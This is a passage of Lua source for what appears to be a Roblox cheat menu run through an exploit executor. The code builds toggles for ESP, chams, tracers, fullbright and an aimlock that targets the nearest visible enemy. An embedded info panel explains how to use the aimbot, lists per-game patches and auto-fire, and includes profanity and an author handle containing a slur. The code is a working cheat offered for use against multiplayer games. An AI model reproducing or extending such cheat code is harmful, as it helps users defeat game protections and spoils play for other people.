	DebugToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	DebugToggle.TextSize = 14
	DebugToggle.TextWrapped = true
	
	FullbrightToggle.Name = "FullbrightToggle"
	FullbrightToggle.Parent = buttons
	FullbrightToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	FullbrightToggle.BackgroundTransparency = 0.5
	FullbrightToggle.BorderSizePixel = 0
	FullbrightToggle.Position = UDim2.new(0, 0, 0, 80)
	FullbrightToggle.Size = UDim2.new(0, 150, 0, 30)
	FullbrightToggle.Font = Enum.Font.SourceSansBold
	FullbrightToggle.Text = "Fullbright"
	FullbrightToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	FullbrightToggle.TextSize = 14
	FullbrightToggle.TextWrapped = true
	
	Crosshair.Name = "Crosshair"
	Crosshair.Parent = buttons
	Crosshair.BackgroundColor3 = Color3.new(1, 1, 1)
	Crosshair.BackgroundTransparency = 0.5
	Crosshair.BorderSizePixel = 0
	Crosshair.Position = UDim2.new(0, 0, 0, 120)
	Crosshair.Size = UDim2.new(0, 150, 0, 30)
	Crosshair.Font = Enum.Font.SourceSansBold
	Crosshair.Text = "Crosshair"
	Crosshair.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Crosshair.TextSize = 14
	Crosshair.TextWrapped = true
	
	AimbotToggle.Name = "AimbotToggle"
	AimbotToggle.Parent = buttons
	AimbotToggle.BackgroundColor3 = Color3.new(1, 1, 1)
	AimbotToggle.BackgroundTransparency = 0.5
	AimbotToggle.BorderSizePixel = 0
	AimbotToggle.Position = UDim2.new(1, -150, 0, 120)
	AimbotToggle.Size = UDim2.new(0, 150, 0, 30)
	AimbotToggle.Font = Enum.Font.SourceSansBold
	AimbotToggle.Text = "Aimlock"
	AimbotToggle.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	AimbotToggle.TextSize = 14
	AimbotToggle.TextWrapped = true
	
	Settings.Name = "Settings"
	Settings.Parent = buttons
	Settings.BackgroundColor3 = Color3.new(1, 1, 1)
	Settings.BackgroundTransparency = 0.5
	Settings.BorderSizePixel = 0
	Settings.Position = UDim2.new(1, -150, 0, 160)
	Settings.Size = UDim2.new(0, 150, 0, 30)
	Settings.Font = Enum.Font.SourceSansBold
	Settings.Text = "Settings"
	Settings.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Settings.TextSize = 14
	Settings.TextWrapped = true
	
	Information.Name = "Information"
	Information.Parent = buttons
	Information.BackgroundColor3 = Color3.new(1, 1, 1)
	Information.BackgroundTransparency = 0.5
	Information.BorderSizePixel = 0
	Information.Position = UDim2.new(0, 0, 0, 160)
	Information.Size = UDim2.new(0, 150, 0, 30)
	Information.Font = Enum.Font.SourceSansBold
	Information.Text = "Information"
	Information.TextColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Information.TextSize = 14
	Information.TextWrapped = true
	
	Information_2.Name = "Information"
	Information_2.Parent = MainFrame
	Information_2.Active = true
	Information_2.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Information_2.BorderSizePixel = 0
	Information_2.Position = UDim2.new(1, 3, 0.5, -138)
	Information_2.Size = UDim2.new(0, 350, 0, 365)
	Information_2.Visible = false
	
	Title_2.Name = "Title"
	Title_2.Parent = Information_2
	Title_2.BackgroundColor3 = Color3.new(1, 1, 1)
	Title_2.BackgroundTransparency = 1
	Title_2.Size = UDim2.new(1, 0, 0, 50)
	Title_2.Font = Enum.Font.SourceSansBold
	Title_2.Text = "Information"
	Title_2.TextColor3 = Color3.new(1, 1, 1)
	Title_2.TextSize = 18
	Title_2.TextTransparency = 0.5
	
	design_2.Name = "design"
	design_2.Parent = Information_2
	design_2.BackgroundColor3 = Color3.new(1, 1, 1)
	design_2.BackgroundTransparency = 0.5
	design_2.BorderSizePixel = 0
	design_2.Position = UDim2.new(0.0500000007, 0, 0, 50)
	design_2.Size = UDim2.new(0.899999976, 0, 0, 2)
	
	buttons_2.Name = "buttons"
	buttons_2.Parent = Information_2
	buttons_2.BackgroundColor3 = Color3.new(1, 1, 1)
	buttons_2.BackgroundTransparency = 1
	buttons_2.BorderSizePixel = 0
	buttons_2.Position = UDim2.new(0, 20, 0, 60)
	buttons_2.Size = UDim2.new(1, -40, 1, -70)
	buttons_2.CanvasSize = UDim2.new(5, 0, 5, 0)
	buttons_2.ScrollBarThickness = 5
	
	TextLabel.Parent = buttons_2
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, -20, 1, 0)
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.Text = [[
Scripting by: Racist Dolphin#5199
GUI by: SOMEONE WHO WANTS HIS NAME HIDDEN.

To hide/show the GUI press the "P" key on your keyboard.

NOTICE: Since my string manipulation skills aren't the greatest, changing esp/cham colors might be quite buggy.
NOTICE #2: The blacklist feature will return! I just didn't have enough time to make the gui.
NOTICE #3: Save Settings might still be bugged. Message me if it's fucked up still.

This works on every game, though the Aimbot does NOT! (Doesn't work on: Jailbreak, and Phantom Forces)

FAQ:
1) How do I use the aimbot?
A: Activate it, and hold right-click in-game. The aimbot will lock on to the closest enemy NOT behind a wall. (If said player is behind a wall, it will find the next closest player not behind a wall.)

2) ESP/Chams don't work on the game I play?
A: Some games require me to make patches (ex: Murder Mystery, Murder Mystery X) to request a patch or a game message me on discord.

3) How did I detect when a player is behind a wall?
A: Raycasting the camera to another player.

4) My bullets still miss when using aimbot?!
A: Blame bullet spread, try and control how often you fire. (Murder Mystery 2 = trash) (Why the fuck does a single shot pistol have bullet spread? lol wtf?)

Change Log:
3/10/2018:
+ Fixed more bugs with chams

3/10/2018:
+ Fixed how chams broke when a player respawned.

3/10/2018:
+ Fixed ESP not updating correctly.
+ Fixed Chams not updating correctly. (MAYBE? IDK WHAT IS BREAKING THIS)

3/9/2018:
+ Mob ESP/Chams! (BETA!)

3/8/2018:
+ Fixed the error you get when not entering a valid number for esp/chams/tracer lengths.
+ Fixed lag issues with aimlock.
+ Fixed lag issues with chams.

3/8/2018:
+ Patch for Murder 15
- Temporarily removed auto fire since mouse1click is broken on Synapse :(

3/7/2018:
+ Updated save settings.
+ Can now customize aimlock key.

3/7/2018:
+ Patch for Wild Revolver.
+ Fix for autofire. (Hopefully)

3/6/2018:
- Removed :IsFriendsWith check. (Use Friends List GUI instead)

3/4/2018:
+ Added Friend List Menu
+ Patch for Assassin!

3/4/2018:
+ Fixed crosshair toggle.
+ Aimlock patch for Island Royal.
+ Finally fixed save settings.

3/4/2018:
+ Aimlock fixed for Unit 1968: Vietnam
+ Autofire setting for aimlock
+ Fixed how you sometimes had to double click buttons to activate a option

3/4/2018:
+ Fixed FreeForAll setting bug.
+ Using aimlock on Phantom Forces / Jailbreak will now tell you it will not work.
* Renamed Aimbot back to Aimlock

3/3/2018:
+ Blacklist feature re-added.
+ Aimbot will no longer focus people in the blacklist.
+ Compatible on exploits that have readfile and writefile.

3/3/2018:
+ GUI Overhaul
+ Aimbot now only targets people NOT behind walls
+ Chams now dim when x player is visible on your screen.
+ Chams no longer have the humanoid root part. (Your welcome)
+ Patch for Silent Assassin
+ My discord was deleted, so I'm using pastebin now. (Auto updates :)
]]
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextSize = 16
	TextLabel.TextTransparency = 0.5
	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	TextLabel.TextYAlignment = Enum.TextYAlignment.Top
	
	Settings_2.Name = "Settings"
	Settings_2.Parent = MainFrame
	Settings_2.Active = true
	Settings_2.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
	Settings_2.BorderSizePixel = 0
	Settings_2.Position = UDim2.new(1, 3, 0.5, -138)
	Settings_2.Size = UDim2.new(0, 350, 0, 365)
	Settings_2.Visible = false
	
	Title_3.Name = "Title"
	Title_3.Parent = Settings_2
	Title_3.BackgroundColor3 = Color3.new(1, 1, 1)
	Title_3.BackgroundTransparency = 1
	Title_3.Size = UDim2.new(1, 0, 0, 50)
	Title_3.Font = Enum.Font.SourceSansBold
	Title_3.Text = "Settings Menu"
	Title_3.TextColor3 = Color3.new(1, 1, 1)
	Title_3.TextSize = 18
	Title_3.TextTransparency = 0.5
	
	design_3.Name = "design"
	design_3.Parent = Settings_2
	design_3.BackgroundColor3 = Color3.new(1, 1, 1)
	design_3.BackgroundTransparency = 0.5
	design_3.BorderSizePixel = 0
	design_3.Position = UDim2.new(0.0500000007, 0, 0, 50)
	design_3.Size = UDim2.new(0.899999976, 0, 0, 2)
	
	buttons_3.Name = "buttons"
	buttons_3.Parent = Settings_2
	buttons_3.BackgroundColor3 = Color3.new(1, 1, 1)
	buttons_3.BackgroundTransparency = 1
	buttons_3.BorderSizePixel = 0
	buttons_3.Position = UDim2.new(0, 20, 0, 60)
	buttons_3.Size = UDim2.new(1, -40, 1, -70)
	buttons_3.ScrollBarThickness = 8
	
	AllyColor.Name = "AllyColor"
	AllyColor.Parent = buttons_3
	AllyColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	AllyColor.BackgroundTransparency = 0.5
	AllyColor.BorderSizePixel = 0
	AllyColor.Position = UDim2.new(1, -150, 0, 180)
	AllyColor.Size = UDim2.new(0, 135, 0, 20)
	AllyColor.Font = Enum.Font.SourceSansBold
	AllyColor.Text = tostring(Bullshit.Colors.Ally)
	AllyColor.TextSize = 14
	AllyColor.TextWrapped = true
	
	CHAMSLength.Name = "CHAMSLength"
	CHAMSLength.Parent = buttons_3
	CHAMSLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	CHAMSLength.BackgroundTransparency = 0.5
	CHAMSLength.BorderSizePixel = 0
	CHAMSLength.Position = UDim2.new(1, -150, 0, 60)
	CHAMSLength.Size = UDim2.new(0, 135, 0, 20)
	CHAMSLength.Font = Enum.Font.SourceSansBold
	CHAMSLength.Text = tostring(Bullshit.CHAMSLength)
	CHAMSLength.TextSize = 14
	CHAMSLength.TextWrapped = true
	
	CrosshairColor.Name = "CrosshairColor"
	CrosshairColor.Parent = buttons_3
	CrosshairColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	CrosshairColor.BackgroundTransparency = 0.5
	CrosshairColor.BorderSizePixel = 0
	CrosshairColor.Position = UDim2.new(1, -150, 0, 270)
	CrosshairColor.Size = UDim2.new(0, 135, 0, 20)
	CrosshairColor.Font = Enum.Font.SourceSansBold
	CrosshairColor.Text = tostring(Bullshit.Colors.Crosshair)
	CrosshairColor.TextSize = 14
	CrosshairColor.TextWrapped = true
	
	ESPLength.Name = "ESPLength"
	ESPLength.Parent = buttons_3
	ESPLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	ESPLength.BackgroundTransparency = 0.5
	ESPLength.BorderSizePixel = 0
	ESPLength.Position = UDim2.new(1, -150, 0, 30)
	ESPLength.Size = UDim2.new(0, 135, 0, 20)
	ESPLength.Font = Enum.Font.SourceSansBold
	ESPLength.Text = tostring(Bullshit.ESPLength)
	ESPLength.TextSize = 14
	ESPLength.TextWrapped = true
	
	EnemyColor.Name = "EnemyColor"
	EnemyColor.Parent = buttons_3
	EnemyColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	EnemyColor.BackgroundTransparency = 0.5
	EnemyColor.BorderSizePixel = 0
	EnemyColor.Position = UDim2.new(1, -150, 0, 150)
	EnemyColor.Size = UDim2.new(0, 135, 0, 20)
	EnemyColor.Font = Enum.Font.SourceSansBold
	EnemyColor.Text = tostring(Bullshit.Colors.Enemy)
	EnemyColor.TextSize = 14
	EnemyColor.TextWrapped = true
	
	FreeForAll.Name = "FreeForAll"
	FreeForAll.Parent = buttons_3
	FreeForAll.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	FreeForAll.BackgroundTransparency = 0.5
	FreeForAll.BorderSizePixel = 0
	FreeForAll.Position = UDim2.new(1, -150, 0, 120)
	FreeForAll.Size = UDim2.new(0, 135, 0, 20)
	FreeForAll.Font = Enum.Font.SourceSansBold
	FreeForAll.Text = tostring(Bullshit.FreeForAll)
	FreeForAll.TextSize = 14
	FreeForAll.TextWrapped = true
	
	FriendColor.Name = "FriendColor"
	FriendColor.Parent = buttons_3
	FriendColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	FriendColor.BackgroundTransparency = 0.5
	FriendColor.BorderSizePixel = 0
	FriendColor.Position = UDim2.new(1, -150, 0, 210)
	FriendColor.Size = UDim2.new(0, 135, 0, 20)
	FriendColor.Font = Enum.Font.SourceSansBold
	FriendColor.Text = tostring(Bullshit.Colors.Friend)
	FriendColor.TextSize = 14
	FriendColor.TextWrapped = true
	
	NeutralColor.Name = "NeutralColor"
	NeutralColor.Parent = buttons_3
	NeutralColor.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	NeutralColor.BackgroundTransparency = 0.5
	NeutralColor.BorderSizePixel = 0
	NeutralColor.Position = UDim2.new(1, -150, 0, 240)
	NeutralColor.Size = UDim2.new(0, 135, 0, 20)
	NeutralColor.Font = Enum.Font.SourceSansBold
	NeutralColor.Text = tostring(Bullshit.Colors.Neutral)
	NeutralColor.TextSize = 14
	NeutralColor.TextWrapped = true
	
	TracersLength.Name = "TracersLength"
	TracersLength.Parent = buttons_3
	TracersLength.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	TracersLength.BackgroundTransparency = 0.5
	TracersLength.BorderSizePixel = 0
	TracersLength.Position = UDim2.new(1, -150, 0, 0)
	TracersLength.Size = UDim2.new(0, 135, 0, 20)
	TracersLength.Font = Enum.Font.SourceSansBold
	TracersLength.Text = tostring(Bullshit.TracersLength)
	TracersLength.TextSize = 14
	TracersLength.TextWrapped = true
	
	TracersUnderChars.Name = "TracersUnderChars"
	TracersUnderChars.Parent = buttons_3
	TracersUnderChars.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	TracersUnderChars.BackgroundTransparency = 0.5
	TracersUnderChars.BorderSizePixel = 0
	TracersUnderChars.Position = UDim2.new(1, -150, 0, 90)
	TracersUnderChars.Size = UDim2.new(0, 135, 0, 20)
	TracersUnderChars.Font = Enum.Font.SourceSansBold
	TracersUnderChars.Text = tostring(Bullshit.PlaceTracersUnderCharacter)
	TracersUnderChars.TextSize = 14
	TracersUnderChars.TextWrapped = true

	AutoFireToggle.Name = "AutoFireToggle"
	AutoFireToggle.Parent = buttons_3
	AutoFireToggle.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	AutoFireToggle.BackgroundTransparency = 0.5
	AutoFireToggle.BorderSizePixel = 0
	AutoFireToggle.Position = UDim2.new(1, -150, 0, 300)
	AutoFireToggle.Size = UDim2.new(0, 135, 0, 20)
	AutoFireToggle.Font = Enum.Font.SourceSansBold
	AutoFireToggle.Text = tostring(Bullshit.AutoFire)
	AutoFireToggle.TextSize = 14
	AutoFireToggle.TextWrapped = true

	AimbotKey.Name = "AimbotKey"
	AimbotKey.Parent = buttons_3
	AimbotKey.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	AimbotKey.BackgroundTransparency = 0.5
	AimbotKey.BorderSizePixel = 0
	AimbotKey.Position = UDim2.new(1, -150, 0, 330)
	AimbotKey.Size = UDim2.new(0, 135, 0, 20)
	AimbotKey.Font = Enum.Font.SourceSansBold
	AimbotKey.Text = tostring(Bullshit.AimbotKey)
	AimbotKey.TextSize = 14
	AimbotKey.TextWrapped = true

	MobESPButton.Name = "MobESPButton"
	MobESPButton.Parent = buttons_3
	MobESPButton.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	MobESPButton.BackgroundTransparency = 0.5
	MobESPButton.BorderSizePixel = 0
	MobESPButton.Position = UDim2.new(1, -150, 0, 360)
	MobESPButton.Size = UDim2.new(0, 135, 0, 20)
	MobESPButton.Font = Enum.Font.SourceSansBold
	MobESPButton.Text = tostring(Bullshit.MobESP)
	MobESPButton.TextSize = 14
	MobESPButton.TextWrapped = true

	MobChamsButton.Name = "MobChamsButton"
	MobChamsButton.Parent = buttons_3
	MobChamsButton.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	MobChamsButton.BackgroundTransparency = 0.5
	MobChamsButton.BorderSizePixel = 0
	MobChamsButton.Position = UDim2.new(1, -150, 0, 390)
	MobChamsButton.Size = UDim2.new(0, 135, 0, 20)
	MobChamsButton.Font = Enum.Font.SourceSansBold
	MobChamsButton.Text = tostring(Bullshit.MobChams)
	MobChamsButton.TextSize = 14
	MobChamsButton.TextWrapped = true
	
	TextLabel_2.Parent = buttons_3
	TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_2.BackgroundTransparency = 1
	TextLabel_2.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_2.Font = Enum.Font.SourceSansBold
	TextLabel_2.Text = "Tracers Length"
	TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_2.TextSize = 16
	TextLabel_2.TextTransparency = 0.5
	
	TextLabel_3.Parent = buttons_3
	TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_3.BackgroundTransparency = 1
	TextLabel_3.Position = UDim2.new(0, 0, 0, 30)
	TextLabel_3.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_3.Font = Enum.Font.SourceSansBold
	TextLabel_3.Text = "ESP Length"
	TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_3.TextSize = 16
	TextLabel_3.TextTransparency = 0.5
	
	TextLabel_4.Parent = buttons_3
	TextLabel_4.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_4.BackgroundTransparency = 1
	TextLabel_4.Position = UDim2.new(0, 0, 0, 60)
	TextLabel_4.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_4.Font = Enum.Font.SourceSansBold
	TextLabel_4.Text = "Chams Length"
	TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_4.TextSize = 16
	TextLabel_4.TextTransparency = 0.5
	
	TextLabel_5.Parent = buttons_3
	TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_5.BackgroundTransparency = 1
	TextLabel_5.Position = UDim2.new(0, 0, 0, 90)
	TextLabel_5.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_5.Font = Enum.Font.SourceSansBold
	TextLabel_5.Text = "Tracers Under Chars"
	TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_5.TextSize = 16
	TextLabel_5.TextTransparency = 0.5
	
	TextLabel_6.Parent = buttons_3
	TextLabel_6.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_6.BackgroundTransparency = 1
	TextLabel_6.Position = UDim2.new(0, 0, 0, 270)
	TextLabel_6.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_6.Font = Enum.Font.SourceSansBold
	TextLabel_6.Text = "Crosshair Color"
	TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_6.TextSize = 16
	TextLabel_6.TextTransparency = 0.5
	
	TextLabel_7.Parent = buttons_3
	TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_7.BackgroundTransparency = 1
	TextLabel_7.Position = UDim2.new(0, 0, 0, 120)
	TextLabel_7.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_7.Font = Enum.Font.SourceSansBold
	TextLabel_7.Text = "Free For All"
	TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_7.TextSize = 16
	TextLabel_7.TextTransparency = 0.5
	
	TextLabel_8.Parent = buttons_3
	TextLabel_8.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_8.BackgroundTransparency = 1
	TextLabel_8.Position = UDim2.new(0, 0, 0, 240)
	TextLabel_8.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_8.Font = Enum.Font.SourceSansBold
	TextLabel_8.Text = "Neutral Color"
	TextLabel_8.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_8.TextSize = 16
	TextLabel_8.TextTransparency = 0.5
	
	TextLabel_9.Parent = buttons_3
	TextLabel_9.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_9.BackgroundTransparency = 1
	TextLabel_9.Position = UDim2.new(0, 0, 0, 150)
	TextLabel_9.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_9.Font = Enum.Font.SourceSansBold
	TextLabel_9.Text = "Enemy Color"
	TextLabel_9.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_9.TextSize = 16
	TextLabel_9.TextTransparency = 0.5
	
	TextLabel_10.Parent = buttons_3
	TextLabel_10.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_10.BackgroundTransparency = 1
	TextLabel_10.Position = UDim2.new(0, 0, 0, 180)
	TextLabel_10.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_10.Font = Enum.Font.SourceSansBold
	TextLabel_10.Text = "Ally Color"
	TextLabel_10.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_10.TextSize = 16
	TextLabel_10.TextTransparency = 0.5
	
	TextLabel_11.Parent = buttons_3
	TextLabel_11.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_11.BackgroundTransparency = 1
	TextLabel_11.Position = UDim2.new(0, 0, 0, 210)
	TextLabel_11.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_11.Font = Enum.Font.SourceSansBold
	TextLabel_11.Text = "Friend Color"
	TextLabel_11.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_11.TextSize = 16
	TextLabel_11.TextTransparency = 0.5

	TextLabel_12.Parent = buttons_3
	TextLabel_12.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_12.BackgroundTransparency = 1
	TextLabel_12.Position = UDim2.new(0, 0, 0, 300)
	TextLabel_12.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_12.Font = Enum.Font.SourceSansBold
	TextLabel_12.Text = "Aimlock Auto Fire"
	TextLabel_12.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_12.TextSize = 16
	TextLabel_12.TextTransparency = 0.5

	TextLabel_13.Parent = buttons_3
	TextLabel_13.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_13.BackgroundTransparency = 1
	TextLabel_13.Position = UDim2.new(0, 0, 0, 330)
	TextLabel_13.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_13.Font = Enum.Font.SourceSansBold
	TextLabel_13.Text = "Aimbot Key"
	TextLabel_13.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_13.TextSize = 16
	TextLabel_13.TextTransparency = 0.5

	TextLabel_14.Parent = buttons_3
	TextLabel_14.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_14.BackgroundTransparency = 1
	TextLabel_14.Position = UDim2.new(0, 0, 0, 360)
	TextLabel_14.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_14.Font = Enum.Font.SourceSansBold
	TextLabel_14.Text = "Mob ESP"
	TextLabel_14.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_14.TextSize = 16
	TextLabel_14.TextTransparency = 0.5

	TextLabel_15.Parent = buttons_3
	TextLabel_15.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel_15.BackgroundTransparency = 1
	TextLabel_15.Position = UDim2.new(0, 0, 0, 390)
	TextLabel_15.Size = UDim2.new(0.5, 0, 0, 20)
	TextLabel_15.Font = Enum.Font.SourceSansBold
	TextLabel_15.Text = "Mob CHAMS"
	TextLabel_15.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_15.TextSize = 16
	TextLabel_15.TextTransparency = 0.5
	
	SaveSettings.Name = "SaveSettings"
	SaveSettings.Parent = buttons_3
	SaveSettings.BackgroundColor3 = Color3.new(0.972549, 0.972549, 0.972549)
	SaveSettings.BackgroundTransparency = 0.5
	SaveSettings.BorderSizePixel = 0
	SaveSettings.Position = UDim2.new(0, 0, 0, 420)
	SaveSettings.Size = UDim2.new(1, -15, 0, 20)
	SaveSettings.Font = Enum.Font.SourceSansBold
	SaveSettings.Text = "Save Settings"
	SaveSettings.TextSize = 14
	SaveSettings.TextWrapped = true

	function CreatePlayerLabel(Str, frame)
		local n = #frame:GetChildren()
		local playername = Instance.new("TextLabel")
		playername.Name = Str
		playername.Parent = frame
		playername.BackgroundColor3 = Color3.new(1, 1, 1)
		playername.BackgroundTransparency = 1
		playername.BorderSizePixel = 0
		playername.Position = UDim2.new(0, 5, 0, (n * 15))
		playername.Size = UDim2.new(1, -25, 0, 15)
		playername.Font = Enum.Font.SourceSans
		playername.Text = Str
		playername.TextColor3 = Color3.new(1, 1, 1)
		playername.TextSize = 16
		playername.TextXAlignment = Enum.TextXAlignment.Left
	end

	function RefreshPlayerLabels(frame, t)
		frame:ClearAllChildren()
		for i, v in next, t do
			CreatePlayerLabel(i, frame)
		end
	end

	RefreshPlayerLabels(players, Bullshit.Blacklist)
	RefreshPlayerLabels(players2, Bullshit.FriendList)
	
	ESPToggle.MouseButton1Click:connect(function()
		Bullshit.ESPEnabled = not Bullshit.ESPEnabled
		if Bullshit.ESPEnabled then
			ESPToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			for _, v in next, Plrs:GetPlayers() do
				if v ~= MyPlr then
					if Bullshit.CharAddedEvent[v.Name] == nil then
						Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
							if Bullshit.ESPEnabled then
								RemoveESP(v)
								CreateESP(v)
							end
							if Bullshit.CHAMSEnabled then
								RemoveChams(v)
								CreateChams(v)
							end
							if Bullshit.TracersEnabled then
								RemoveTracers(v)
								CreateTracers(v)
							end
							repeat wait() until Char:FindFirstChild("HumanoidRootPart")
							TracerMT[v.Name] = Char.HumanoidRootPart
						end)
					end
					RemoveESP(v)
					CreateESP(v)
				end
			end
			CreateMobESPChams()
		else
			ESPToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			PlayerESP:ClearAllChildren()
			ItemESP:ClearAllChildren()
		end
	end)
	
	ChamsToggle.MouseButton1Click:connect(function()
		Bullshit.CHAMSEnabled = not Bullshit.CHAMSEnabled
		if Bullshit.CHAMSEnabled then
			ChamsToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			for _, v in next, Plrs:GetPlayers() do
				if v ~= MyPlr then
					if Bullshit.CharAddedEvent[v.Name] == nil then
						Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
							if Bullshit.ESPEnabled then
								RemoveESP(v)
								CreateESP(v)
							end
							if Bullshit.CHAMSEnabled then
								RemoveChams(v)
								CreateChams(v)
							end
							if Bullshit.TracersEnabled then
								RemoveTracers(v)
								CreateTracers(v)
							end
							repeat wait() until Char:FindFirstChild("HumanoidRootPart")
							TracerMT[v.Name] = Char.HumanoidRootPart
						end)
					end
					RemoveChams(v)
					CreateChams(v)
				end
			end
			CreateMobESPChams()
		else
			ChamsToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			PlayerChams:ClearAllChildren()
			ItemChams:ClearAllChildren()
		end
	end)
	
	TracersToggle.MouseButton1Click:connect(function()
		Bullshit.TracersEnabled = not Bullshit.TracersEnabled
		if Bullshit.TracersEnabled then
			TracersToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			for _, v in next, Plrs:GetPlayers() do
				if v ~= MyPlr then
					if Bullshit.CharAddedEvent[v.Name] == nil then
						Bullshit.CharAddedEvent[v.Name] = v.CharacterAdded:connect(function(Char)
							if Bullshit.ESPEnabled then
								RemoveESP(v)
								CreateESP(v)
							end
							if Bullshit.CHAMSEnabled then
								RemoveChams(v)
								CreateChams(v)
							end
							if Bullshit.TracersEnabled then
								RemoveTracers(v)
								CreateTracers(v)
							end
						end)
					end
					if v.Character ~= nil then
						local Tor = v.Character:FindFirstChild("HumanoidRootPart")
						if Tor then
							TracerMT[v.Name] = Tor
						end
					end
					RemoveTracers(v)
					CreateTracers(v)
				end
			end
		else
			TracersToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			for _, v in next, Plrs:GetPlayers() do
				RemoveTracers(v)
			end
		end
	end)

	DebugToggle.MouseButton1Click:connect(function()
		Bullshit.DebugInfo = not Bullshit.DebugInfo
		DebugMenu["Main"].Visible = Bullshit.DebugInfo
		if Bullshit.DebugInfo then
			DebugToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
		else
			DebugToggle.BackgroundColor3 = Color3.new(1, 1, 1)
		end
	end)

	OutlineToggle.MouseButton1Click:connect(function()
		Bullshit.OutlinesEnabled = not Bullshit.OutlinesEnabled
		if Bullshit.OutlinesEnabled then
			OutlineToggle.BackgroundColor3 = Color3.new(0/255,171/255,11/255)
			for _, v in next, workspace:GetDescendants() do
				if v:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(v.Parent) and not v.Parent:IsA("Hat") and not v.Parent:IsA("Accessory") and v.Parent.Name ~= "Tracers" then
					local Data = { }
					Data[2] = v.Transparency
					v.Transparency = 1
					local outline = Instance.new("SelectionBox")
					outline.Name = "Outline"
					outline.Color3 = Color3.new(0, 0, 0)
					outline.SurfaceColor3 = Color3.new(0, 1, 0)
					--outline.SurfaceTransparency = 0.9
					outline.LineThickness = 0.01
					outline.Transparency = 0.3
					outline.Adornee = v
					outline.Parent = v
					Data[1] = outline
					rawset(Bullshit.OutlinedParts, v, Data)
				end
				CreateChildAddedEventFor(v)
			end
			CreateChildAddedEventFor(workspace)
			if Bullshit.LightingEvent == nil then
				Bullshit.LightingEvent = game:GetService("Lighting").Changed:connect(LightingHax)
			end
		else
			OutlineToggle.BackgroundColor3 = Color3.new(1, 1, 1)
			for i, v in next, Bullshit.OutlinedParts do
